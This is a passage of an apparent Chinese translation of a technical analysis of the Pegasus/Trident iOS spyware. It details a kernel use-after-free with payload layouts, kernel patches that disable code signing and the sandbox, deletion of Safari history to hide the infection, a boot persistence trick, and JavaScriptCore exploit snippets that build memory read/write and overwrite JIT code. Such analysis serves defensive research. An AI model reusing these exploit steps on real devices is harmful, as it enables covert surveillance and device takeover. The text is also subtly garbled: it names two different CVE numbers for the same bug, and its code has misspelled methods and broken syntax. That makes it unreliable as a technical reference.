&lt;string&gt;2&lt;/string&gt;&lt;/dict&gt;</code></pre><p>上面的XML一旦序列化，将包含五个对象。第一个对象是字典容器（<code>&lt;dict&gt;</code>表示kOSSerializeDictionary对象），后跟表示键的符号（“KEY1”赋给kOSSerializeSymbol）及其数据对象（整数1赋给kOSSerializeNumber）。第四个属性指定另一个密钥对象，会再次分配给KEY1，现在这个属性是一个包含字符串“2”的字符串对象（kOSSerializeString）。作为反序列化过程的一部分，KEY1的重用导致接下来的对象会替换分配给KEY1的原始值。用新数据替换密钥便是<em>OSUnserializeBinary</em>容易受到攻击的地方。</p><p>如前所述，当对象被反序列化时，只要该对象不是kOSSerializeObject，该对象就存储在objsArray中以供之后引用。此存储是setAtIndex宏的结果，如下：</p><pre><code>#define setAtIndex(v, idx, o) \        if (idx &gt;= v##Capacity) \        { \                unint32_t ncap = v##Capacity+64; \                typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \                if (!nbuf) ok =false; \                if(v##Array) \                { \                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \                        kfree(v##Array,v##Capacity * sizeof(o)); \                } \                v##Array=nbuf; \                v##Capacity=ncap; \        } \        if (ok) v##Array[idx]=o;</code></pre><p>宏将扩展objsArray以容纳附加对象，并将对象分配到objsArray的末尾，而不通过o-&gt; retain（）调用增加其引用计数。此方法的问题在于，当第二个对象替换现有对象时（在我们的示例中，就是每当字符串对象替换KEY1的数字对象时），第一个对象被释放并随后被释放，但是指向现在释放的对象的指针存在于objsArray中。通常这只是一个糟糕的编程设计问题，但如果通过kOSSerializeObject条目引用该对象，则问题会变得更加复杂。如果kOSSerializeObject条目通过索引引用已释放对象的指针，则对o-&gt; retain（）的调用将尝试执行受攻击者控制的虚函数。</p><p>为了利用UAF漏洞，32Stage2必须控制已解除分配的内存位置，并放置一个自定义vtable，它将使retain条目指向自己选择的函数。安装自定义vtable需要访问两个已释放的相邻内存位置。由于在序列化过程中无法直接覆盖对象的vtable，通过分配然后释放两个内存位置，32Stage2可以使用OSData或OSString对象一次替换两个内存位置，其中一个内存位置包含恶意vtable。导致UAF漏洞的上述条件是CVE-2016-18284的结果，并且存在于9.0到9.3.1的iOS版本中。32Stage2通过使用以下payload来利用此漏洞，以便在iOS时钟处理程序中安装内核读/写原语。   </p><pre><code>[0x00] kOSSerailizeBinarySignature[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10[0x08] kOSSerailizeString | 4[0x0C] &quot;sy2&quot;[0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10[0x14] kOSSerailizeDictionary | 0x10[0x18] kOSSerailizeSymbol | 4[0x1C] &quot;sy1&quot;[0x20] kOSSerailizeData | 0x14[0x24] &quot;ffff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;[0x38] kOSSerailizeSymbol | 4[0x3C] &quot;sy1&quot;[0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4[0x44] &quot;sy1&quot;[0x48] kOSSerailizeString | 0x1C[0x4C] {payload buffer}[0x68] kOSSerailizeString | 0x1C[0x6C] {payload buffer}[0x88] kOSSerailizeString | 0x1C[0x8C] {payload buffer}[0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5</code></pre><p>在payload中，32Stage2重用sy1密钥以通过UAF漏洞激活payload。</p><p>从iOS版本9.3.2开始，修补了CVE-2016-1828漏洞，这迫使需要一种不同的机制来安装内核读/写原语。但是，OSUnserializeBinary的kOSSerializeObject仍包含UAF漏洞。</p><p>理解这个概念的最简单方法是查看32Stage2生成的payload，以利用OSUnserializeBinary UAF漏洞。</p><p>对于iOS版本9.3.2至少9.3.3，payload采用以下形式：</p><pre><code>[0x00] kOSSerailizeBinarySignature[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10[0x08] kOSSerializeString | 4[0x0C] &quot;sy2&quot;[0x10] kOSSerializeData | 0x14[0x14] {payload buffer}[0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 </code></pre><p>虽然在结构上它们看起来有些不同，但最终它们都利用了UAF漏洞。在iOS 9.3.2及更高版本中使用的这种更简单的payload是最容易理解的。当OSUnserializeBinary开始反序列化payload的解析过程时，该函数将创建一个新的字典对象，偏移0x04处的运行结果。在词典中有两个无键对象。第一个对象是一个<strong>OSString</strong>对象，其值为<strong>sy2</strong>（分别在偏移量0x08和0x0C中指定）。在偏移量0x10处指定大小为0x14（20）字节的<strong>OSData</strong>对象。OSData对象包含payload缓冲区数据结构。由于对象是无键的，OSUnserializeBinary将用OSData对象替换OSString对象，但将指针留在objsArray中。由于OSString对象没有retain（）调用，OSString被释放，从而将两个内存数组放入空闲列表中（一个用于OSString对象本身，另一个用于与OSString对象关联的字符串）。</p><p>当OSUnserializeBinary解析kOSSerializeData时，将分配新的OSData对象，从而从空闲列表中消耗一个已释放的内存位置。当与kOSSerializeData关联的数据被复制到OSData对象中时，将为数据分配新的缓冲区，该缓冲区将消耗空闲列表中的剩余数据位置。此时，objsArray中的悬空指针已被OSData对象的数据替换。它是与OSData对象关联的数据，其中包含恶意payload，最终将给予32Stage2写访问内核权限，以便安装读/写原语。</p><p>无论iOS版本如何，恶意payload都包含相同的payload缓冲区。payload缓冲区是一个20字节的结构，由以下元素组成：</p><pre><code>[00] address of uaf_payload_buffer + 8[04] {uninitialized data from stack}[08] address of uaf_payload_buffer[0C] static value of 20[10] address of OSSerializer::serialize</code></pre><p>payload必须包含指向偏移量0x10处新保留函数的指针。32Stage2使用OSSerializer :: serialize函数作为替换保留。这种设计意味着payload的其余部分必须模拟OSSerializer对象的vtable。如先前在已植入的设备上建立读/写/执行原语所述，OSSerializer :: serialize函数将在所提供的vtable的偏移0x10处调用该函数，同时将vtable的偏移0x08和0x0C传递给被调用的函数。假设偏移量0x10设置为OSSerializer :: serialize，则会再次调用该函数，但第二次将调用偏移量0x08指定的vtable。此调用会导致一系列后续调用，最终导致调用 <strong>_copyin</strong>，这个函数替换实时和电池时钟的getattr处理程序，正如在之前植入的设备上建立读/写/执行原语步骤中所述。</p><p>在执行漏洞利用之后，如果受害者的手机是“iPhone4,1”，则控制之前生成的1000个线程的全局变量值将设置为-1以终止线程。</p><p>为验证电池时钟的getattr处理程序是否成功读取内核内存地址，将调用<em>clock_get _attributes</em>，并将读取位置指定为内核的基址。如果<em>clock_get _attributes</em>的结果不是魔术值<code>0xFEEDFACE</code>，则再次尝试。 第二次失败导致调用assert回调并终止32Stage2。</p><h4 id="建立内核读-写基元（64位）"><a href="#建立内核读-写基元（64位）" class="headerlink" title="建立内核读/写基元（64位）"></a>建立内核读/写基元（64位）</h4><p>在第二阶段的64位版本中利用了相同的底层漏洞。原则上，漏洞利用的结构非常类似。主要区别在于通过写入<strong>net.inet.ip.dummynet.extract _ heap</strong> sysctl处理程序来建立最终的执行原语。OSSerializer :: serialize的使用方式与32Stage2中的类似。然后使用在建立内核执行原语（32位）中描述的相同机制来实现任意代码执行（通过执行任意ROP链）。</p><h4 id="建立内核执行原语（32位）"><a href="#建立内核执行原语（32位）" class="headerlink" title="建立内核执行原语（32位）"></a>建立内核执行原语（32位）</h4><p>正如之前在Rooted Devices上安装内核访问处理程序中所解释的那样，实时时钟的getattr处理程序指向OSSerializer :: serialize，它允许clock_get_attributes的调用者将特制结构传递给OSSerializer :: serialize以便在内核空间中执行指令。要在内核空间内执行，用户区32Stage2进程必须具有以可靠的方式将数据传输到内核地址空间的方法。 32Stage2使用管道创建的管道集的方法来完成此任务。</p><p>在将电池时钟的新getattr处理程序建立为<em> _bufattr _cpx</em> 之后，32Stage2有一个可靠的方法将DWORD从内核地址空间读入用户空间。32Stage2使用此功能来查找存储在内核中的<strong>addrperm</strong>值。addrperm重新定义数据传入用户区时在内核中的偏移量，以便混淆内核中数据的真实位置。如果获得该值，可以将内核地址反混淆到其真实地址值。32Stage2从生成的管道集中调用读取管道的<strong>fstat</strong>，然后计算<strong>stat</strong>结构的位置与内核地址空间之间的差异。然后将该值存储在全局变量中，供必须访问内核内存以执行代码的函数使用。</p><p>每当32Stage2想要在内核中执行代码时，以下数据结构将写入生成的管道集中write pipe：</p><pre><code>[00] argument 1[04] argument 2[08] address of cpde execute</code></pre><p>为了调用数据偏移量8中指定的函数，另一个DWORD被预先添加到数据中并传递给实时时钟的getattr处理程序（通过OSSerializer :: serialize访问），它在调用要执行的函数地址之前将参数1放入R3和参数2放入R1。通过将未使用的DWORD添加到数据结构中，该数据块成为OSSerializer的vtable替代品。该技术用于32Stage2中的两个不同函数。 一个函数允许任意内核函数调用，另一个函数用于将DWORD值写入内核地址空间。</p><h4 id="修补内核以允许内核端口访问"><a href="#修补内核以允许内核端口访问" class="headerlink" title="修补内核以允许内核端口访问"></a>修补内核以允许内核端口访问</h4><p>由于能够在内核地址空间内读取，写入和执行任意位置，下一步是通过内核端口获得对内核的更直接访问。如果使用PID值0调用，则 <strong>  _for_pid </strong> 会返回错误。为了绕过这种保护，第2阶段修改了<strong>task_for_pid</strong>中的四个不同位置。在开始修改<strong>task_for_pid</strong>之前，阶段2确定需要修该改的区域是否在可读取/执行的内存区域内。如果内存不可写，则第2阶段将直接修改内存区域的权限以允许写访问，然后使dcache无效并刷新数据和TLBs指令以确保内存区域进行权限更新。</p><p>修改<strong>task_for_pid</strong>以允许调用者获得内核的端口后， 在调用assert回调和退出之前，第2阶段将尝试通过调用<strong>task_for_pid（mach_task_self，0，＆port）</strong>来获取五次内核端口，每次尝试之间有100次毫秒延迟。</p><h2 id="阶段三：提权和实现越狱"><a href="#阶段三：提权和实现越狱" class="headerlink" title="阶段三：提权和实现越狱"></a>阶段三：提权和实现越狱</h2><p>本节介绍在第2阶段执行的最终步骤，以获取iPhone上的root访问权限，禁用代码签名，然后实现越狱。 此阶段利用最终的Trident漏洞，该漏洞会造成内核内存损坏导致越狱（CVE-2016-4656）。</p><h3 id="修改系统以提权"><a href="#修改系统以提权" class="headerlink" title="修改系统以提权"></a>修改系统以提权</h3><p>32Stage2的下一步是在受害者的手机上获得root访问权限。如果第2阶段进程没有以root用户身份运行（UID = 0），在非越狱手机上不可能以root运行，第2阶段会修补setreuid功能跳过对提权的检查。若对setreuid的修改完成，该函数最多被调用五次（每次调用之间有500ms的延迟），直到setreuid（0,0）返回成功。在五次尝试之后（或在成功的setreuid调用之后），修改后的setreuid会给出相反的结果。最后检查进程的用户值（UID）以确保它确实是root（0）。 如果函数getuid返回0以外的任何值，则调用assert并退出阶段2。</p><p>阶段2通过实时时钟<strong>clock_get_attributes</strong>调用内核函数<strong>kauth_cred_get_with_ref</strong>，以便接收主线程的凭证。在此之后，第2阶段将找到mac_policy_list，其中包含当前加载到iOS内核中的访问控制策略模块列表。阶段2检查列表，查找以名称“Seat”开头的模块，可参考“Seatbelt沙箱策略”。如果未找到策略模块，则阶段2调用断言回调并终止。但是，如果找到该模块，则会读取并修改<strong>mpc_field_off</strong>，以允许当前进程更大程度地控制受害者的iPhone。</p><p>因为可访问内核端口并且删除了将阻止第2阶段执行通常被沙箱策略阻止的权限操作的限制，阶段2不再需要实时时钟的getattr处理程序。为了确保将来对此处理程序的调用不会使手机崩溃，将修改getattr函数指针以指向指令：<br><code>BX LR</code><br>这个新的处理函数有效地将未来对实时时钟的getattr调用转换为NOP。这可能是为了确保将来调用getattr处理程序（通过某些其他进程）不会产生意外后果并导致内核崩溃。</p><h3 id="禁用代码签名"><a href="#禁用代码签名" class="headerlink" title="禁用代码签名"></a>禁用代码签名</h3><p>默认情况下，标准iPhone上的iOS将阻止未签名的代码通过正常方式运行，例如<code>execv</code>或系统调用。同样，通过将文件系统设置为只读，可以防止对根文件系统的修改。这些情况将阻止第2阶段执行越狱程序，并将阻止越狱程序（如果它激活）修改系统。第2阶段修改了几个内核函数和两个内核扩展（kext），以允许这些禁止的操作。第2阶段首先找到<code>com.apple.driver.AppleMobileFileIntegrity</code>和<code>com.apple.driver.LightweightVolumeManager</code>的kext。<code>com.apple.driver.AppleMobileFileIntegrity</code>（AMFI）扩展程序负责实施iOS的代码签名功能。<code>com.apple.driver.LightweightVolumeManager</code>扩展负责主存储设备的分区表。阶段2通过调用OSKextCopyLoadedKextInfo来定位每个扩展，该函数返回含有扩展信息的字典对象。在字典中的是当扩展被调用时的加载偏移量，阶段二通过添加一已知的偏移量将其放入内核地址中。</p><p>使用AMFI的内核地址，阶段2定位以下全局变量：<br><code>amfi_get_out_of_my_way</code><br><code>cs_enforcement_disable</code><br>这两个变量在设置好后会禁用AFMI并禁用代码签名。然后，阶段2设置另外两个全局变量：debug _ flags和DEBUGflag。 这两个变量允许对受害者的iPhone进行调试权限，进一步减少沙箱（SEATBELT）对设备施加的限制。</p><p>接下来，第2阶段修改内核函数<code>vm_map_enter</code>和<code>vm_map_protect</code>，以便在虚拟内存管理器中禁用代码签名验证（可以分配RWX区域）。在此之后，第2阶段修改LightweightVolumeManager中的<code>_mapForIO</code>函数，然后修改内核函数csops以禁用更多的代码签名保护。</p><h3 id="重新安装驱动器"><a href="#重新安装驱动器" class="headerlink" title="重新安装驱动器"></a>重新安装驱动器</h3><p>为了越狱设备，必须拥有根文件系统写权限。阶段2通过对<code>/ sbin / launchd</code>调用访问函数来测试根文件系统的可写性，以确定阶段2是否具有对根文件系统的写访问权。如果文件是只读的，则第2阶段修补内核函数<code>_ mac _ mount</code>以禁用保护策略，该策略阻止将文件系统重新安装为读/写，然后通过调用<code>mount(“hfs”, “/”, MNT _ UPDATE ,mountData)</code>将root文件系统重新安装为读/写，其中mountData指定<code>/ dev / disk0s1s1</code>设备。</p><p>如此编写使得它只能在iOS 9系列iPhone上运行，但代码存在表明它曾经在较旧的iOS版本上使用过。作为支持此声明的证据，在第2阶段重新安装根文件系统后会调用一个函数，如果它在iOS 7，iOS 8或iOS 9上运行，则修改其执行路径。根据iOS版本，函数在<code>/ bin / launchctl</code>（适用于iOS 7和8）或<code>/ bin / launchd</code>（适用于iOS 9）上调用<code>fsctl</code>。<code>fsctl</code>将修改低磁盘空间警告阈值以及极低磁盘空间警告阈值，分别将值设置为8192和8208。</p><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>由于Safari中允许任意代码执行的漏洞，第2阶段被激活。作为第2阶段在实现越狱之前执行的最后一项活动之一，第2阶段尝试通过清理Safari中的历史记录和缓存文件来覆盖其感染向量。清除Safari浏览器历史记录和缓存文件的过程非常简单，并且特定于iOS版本。</p><p>对于iOS 8和iOS 9（如果未在iOS 9上运行，第2阶段将在开始时终止），将从受害者的iPhone中立即删除以下文件以删除浏览器和缓存信息：</p><pre><code>• /Library/Safari/SuspendState.plist• /Library/Safari/History.db• /Library/Safari/History.db-shm• /Library/Safari/History.db-wal• /Library/Safari/History.db-journal• /Library/Caches/com.apple.mobilesafari/Cache.db• /Library/Caches/com.apple.mobilesafari/Cache.db-shm• /Library/Caches/com.apple.mobilesafari/Cache.db-wal• /Library/Caches/com.apple.mobilesafari/Cache.db-journal• (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/</code></pre><p>对于iOS 7，将删除以下文件：</p><pre><code>• /Library/Caches/com.apple.mobilesafari/Cache.db• /Library/Caches/com.apple.mobilesafari/Cache.db-shm• /Library/Caches/com.apple.mobilesafari/Cache.db-wal• /Library/Caches/com.apple.mobilesafari/Cache.db-journal</code></pre><p>最后调用<code>sync</code>，以确保将删除写入磁盘。</p><h3 id="下一阶段安装"><a href="#下一阶段安装" class="headerlink" title="下一阶段安装"></a>下一阶段安装</h3><p>再次给出使用最初针对较旧的iOS版本的代码的证据，主线程调用的下一个函数进行解压缩并将两个文件放到受害者的文件系统上。以下代码段说明了Stage 2如何确定越狱二进制文件在受害者设备上的位置：</p><pre><code>if ( ( unsigned int) ( majorVersion -8 )){    if ( majorVersion ==7 ){        pszJBFilenamePath = &quot;/bin/sh&quot;;        if( flag )            pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;;    }    else{        assert();        writeLog(3, &quot;%.2s%5.5d\n&quot;, &quot;bh.c&quot;, 134);        exit(-1);        pszJBFilenamePath =0;    }}else{    pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;;}</code></pre><p>代码片段显示，对于iOS版本7，下一阶段二进制文件的安装路径是<code>/ bin / sh</code>或<code>/ private / var / tmp / jb-install</code>（如果flag为非零）。对于早于7的iOS版本，将调用断言回调并终止程序。 对于iOS 8及更高版本，安装路径指定为<code>/ sbin / mount _ nfs.temp</code>。</p><p>包含下一阶段二进制的数据blob的大小被验证为非零。如果大小为零，则发生断言回调并终止第2阶段。然后，阶段2使用<code>BZ2 _ *</code> API函数将数据解压缩为两个文件：第一个文件是下一个阶段的二进制文件，对于iOS 9，它存储在<code>/ sbin / mount _ nfs.temp</code>中。 第二个文件是配置文件，存储在<code>/ private / var / tmp / jb _ cfg</code>中。</p><p>在控制返回主线程之前，这两个文件的权限更改为<code>0755</code>（使文件可执行）。</p><p>Stage 2在终止之前调用的最终函数负责移动上一步骤中放下的二进制文件。对于iOS版本8和9，文件<code>/ sbin / mount _ nfs.temp</code>重命名为<code>/ sbin / mount _ nfs</code>。如果受害者手机上的iOS是iOS 9，则会在重命名操作之前尝试删除<code>/ sbin / mount _ nfs</code>。重命名文件后，调用assert回调函数，然后调用exit函数，终止Stage 2。</p><p>一旦执行返回主线程，第2阶段将以静默方式终止</p><h3 id="现有的越狱检测"><a href="#现有的越狱检测" class="headerlink" title="现有的越狱检测"></a>现有的越狱检测</h3><p>如前所述，Stage 2二进制文件以两种不同的模式运行。第一个已经讨论过，其构成了一个完整的iOS漏洞利用和越狱。 第二个是在已经越狱的系统上运行Stage 2二进制文件时所采用策略。在第二模式下，第2阶段只是利用现有的越狱后门来安装Pegasus特定的内核补丁。</p><p>为了确定设备是否已经越狱，第2阶段尝试利用常见的越狱后门获取进入iOS内核的有效机器端口。只需通过调用<code>task _ for _ pid</code>并将PID值设置为0来执行此检查。 修改<code>task _ for _ pid</code>是iOS越狱使用的常见后门机制，它使用户模式进程有直接内核内存访问的权力。iOS通常不允许使用PID为0的<code>task _ for _ pid</code>。如果<code>task _ for _ pid</code>返回有效的任务端口，Stage 2进程就可以提升对内核的访问权限，那么就可以放弃前面描述的权限提升步骤。</p><p>阶段2还检查<code>/ bin / sh</code>在不在。在未越狱手机上，这个二进制文件永远不应该存在。当阶段2检测到此二进制文件的存在时，它假定现有的越狱程序与Pegasus不兼容或者所有必需的内核补丁已经到位并且不需要进一步的操作。当在设备上存在<code>/ bin / sh</code>时，阶段2不用进行攻击直接退出即可。</p><h2 id="四：Pegasus持久性机制"><a href="#四：Pegasus持久性机制" class="headerlink" title="四：Pegasus持久性机制"></a>四：Pegasus持久性机制</h2><p>本节详细介绍了Pegasus通过Trident漏洞进行攻击后保留在设备上的持久性机制，并在每次设备重新启动时继续执行未签名的代码。</p><h3 id="Pegasus持久性机制"><a href="#Pegasus持久性机制" class="headerlink" title="Pegasus持久性机制"></a>Pegasus持久性机制</h3><p>Pegasus使用的持久性机制在每次设备启动时可靠地执行未签名的代码（并最终执行内核漏洞以再次越狱设备）依赖于两个不同问题的组合。</p><p>第一个问题是<code>plist</code>中存在<code>rtbuddyd</code>服务（在设备启动时启动）。请注意，在iOS 10之前，rtbuddyd存在于某些iPhone设备上，例如iPhone 6S，但不存在于<code>iPhone 6</code>等其他设备上。因此，任何可以复制到指定路径（<code>/ usr / libexec / rtbuddyd</code>）的已签名二进制文件都将在引导时使用plist中指定的参数（特别是“<code>--early-boot</code>”）执行。</p><pre><code>&lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt;</code></pre><p>由于此行为，系统上的任何已签名二进制文件都可以在引导时使用单个参数执行。通过在当前工作目录中创建名为<code>--early-boot</code>的符号链接，可以将任意文件作为第一个参数传递给已复制到<code>rtbuddyd</code>位置的任意已签名二进制文件。</p><p>此持久性机制中利用的第二个问题是JavaScriptCore二进制文件中的漏洞。Pegasus利用前面描述的方法，通过将文件复制到<code>/ usr / libexec / rtbuddyd</code>来执行jsc二进制文件（JavaScriptCore）。然后可以通过创建名为<code>--early-boot</code>的符号链接来执行任意JavaScript代码，该符号链接指向要在引导时执行的代码文件。然后Pegasus利用jsc二进制文件中的错误转换来执行未签名的代码并重新利用内核。</p><h3 id="JavaScriptCore内存损坏问题"><a href="#JavaScriptCore内存损坏问题" class="headerlink" title="JavaScriptCore内存损坏问题"></a>JavaScriptCore内存损坏问题</h3><p>该问题存在于JavaScript绑定的<code>setImpureGetterDelegate（）</code>中（由<code>functionSetImpureGetterDelegate</code>支持）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EncodeJSValue JSC_HOST_CALL <span class="title">functionSetImpureGetterDelegate</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">JSLockHolder <span class="title">lock</span><span class="params">(exec)</span></span>;</span><br><span class="line">JSValue base = exec-&gt;argument(<span class="number">0</span>)；</span><br><span class="line"><span class="keyword">if</span>(!base.isObject())</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">JSValue delegate =exec-&gt;argument(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!delegate.isObject())</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell()));</span><br><span class="line">impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell()));</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个绑定有两个参数：第一个是ImpureGetter，第二个是将被设置为ImpureGetter delegate的通用JSObject。这个问题是由于缺乏验证，JSObject作为第一个参数实际上是一个格式正确的ImpureGetter。当另一个对象类型作为第一个参数传递时，对象指针将不正确地向下转换为ImpureGetter指针。</p><p>随后，当通过<code>setDelegate（)</code>设置<code>m_delegate</code>时，指向作为第二个参数传递的JSObject的指针将写入与<code>m_delegate</code>对齐的偏移量（16个字节到提供的对象中）。此问题可用于创建一个原语，允许将指向任意JSObject的指针写入16个字节到任何其他JSObject中。</p><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>Pegasus利用此问题在iOS应用程序执行时实现未签名代码执行。为了获得对执行流程的控制，该攻击利用了许多<code>DataView</code>对象。使用<code>DataView</code>是因为它们提供了一种简单的机制来读取和写入向量中的任意偏移量。DataView对象在16字节偏移处有一个指向缓冲区的指针。利用这些损坏的DataView对象，漏洞利用程序安装获取任意本机代码执行权所需的工具 - 即读/写原语以及暴露任意JavaScript对象地址。完成此设置后，漏洞利用程序就可以创建包含本机代码payload的可执行映射。 以下部分详细介绍了此过程的各个阶段。</p><h4 id="获取任意读-写原语"><a href="#获取任意读-写原语" class="headerlink" title="获取任意读/写原语"></a>获取任意读/写原语</h4><p>可以使用以下代码片段获取用于DataView对象的任意偏移量的读/写原语。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer(<span class="number">0x20</span>);</span><br><span class="line">var dataview_init_rw = <span class="keyword">new</span> DataView(dummy_ab);</span><br><span class="line">...</span><br><span class="line">var dataview_rw = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDalagate(dataview_init_rw, dataview_rw);</span><br></pre></td></tr></table></figure></p><p>首先，使用虚拟<code>ArrayBuffer</code>作为两者的后备向量创建两个DataView。接下来，利用指向<code>dataview_rw</code>的指针来利用该问题来破坏<code>dataview_init_rw</code>的<code>m_vector</code>成员。对<code>dataview_init_rw</code> 后续读取和写入，DataView会让dataview_rw的任一成员泄露或重写。接下来，对该对象的控制用于获得整个进程存储器的读/写原语。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var DATAVIEW_ARRAYBUFFER_OFFSET = <span class="number">0x10</span>;</span><br><span class="line">var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + <span class="number">4</span>;</span><br><span class="line">var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + <span class="number">4</span>;</span><br><span class="line">var FAST_TYPED_ARRAY_MODE = <span class="number">0</span>;</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, <span class="number">0</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, <span class="number">0xFFFFFFFF</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>向dataview_rw DataView中写入三个偏移量。首先，指向后备向量的指针指向零地址。然后将DataView的长度设置为<code>0xFFFFFFFF</code>，有效地设置DataView以映射进程的所有虚拟内存。最后，将模式设置为简单类型（即<code>FastTypedArray</code>），允许在给定虚拟地址的情况下将偏移量计算到DataView中。<code>dataview_rw DataView</code>现在通过它公开的getType和setType方法提供任意读/写原语。</p><h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>所需的最后一个原语可以暴露任意JavaScript对象的虚拟内存地址。使用上面利用的相同问题来泄漏单个对象的地址而不是暴露整个存储器空间来实现该原语。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer (<span class="number">0x20</span>);</span><br><span class="line">...</span><br><span class="line">var dataview_leak_addr = <span class="keyword">new</span> DataView ( dummy_ab);</span><br><span class="line">var dataview_dv_leak = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDelegate (dataview_leak_addr, object_to_leak );</span><br><span class="line">leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture);</span><br></pre></td></tr></table></figure></p><p>同样，使用虚拟ArrayBuffer作为两者的支持向量创建两个DataView。接下来，用指向<code>dataview_leak_addr</code>的指针来利用该问题去破坏<code>dataview_dv_leak</code>的<code>m_vector</code>成员。为泄漏任意JavaScript对象的地址，第二次触发该问题。这次，dataview_leak_addr DataView的m_vector被需泄露的对象的地址代替。最后，可以读取<code>dataview_dv_leak DataView</code>中偏移16个字节的dword以获取目标对象的地址。</p><h4 id="未签名的本机代码执行"><a href="#未签名的本机代码执行" class="headerlink" title="未签名的本机代码执行"></a>未签名的本机代码执行</h4><p>如第1阶段Safari漏洞利用中所使用的那样，Pegasus在本攻击中使用相同的机制来获取代码执行权限。该漏洞创建了一个可执行映射，其中包含要执行的shellcode。为了实现这个目的，创建了一个JSFunction对象（含有数百个空的try / catch块，稍后将被覆盖）。为了帮助确保JIT将JavaScript编译为本机代码，随后会重复调用该函数。鉴于JavaScriptCore库的性质，此JIT编译的本机代码将驻留在映射为读/写/执行的内存区域中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var body =<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (var k=<span class="number">0</span>; k&lt;<span class="number">0x600</span>; k++)&#123;</span><br><span class="line">body+= 'try () catch(e) ();';</span><br><span class="line">&#125;</span><br><span class="line">var to_overwrite = <span class="keyword">new</span> Function(<span class="string">'a'</span>, body);</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后可以读取此JSFunction对象的地址，并且可以读取各种成员以获取RWX映射的地址。然后用shellcode覆盖JITed try / catch块，并且可以简单地调用<code>to_overwrite（）</code>函数来实现任意代码执行。</p>]]></content>
    
    <summary type="html">
    
      英语翻译不行啊
    
    </summary>
    
    
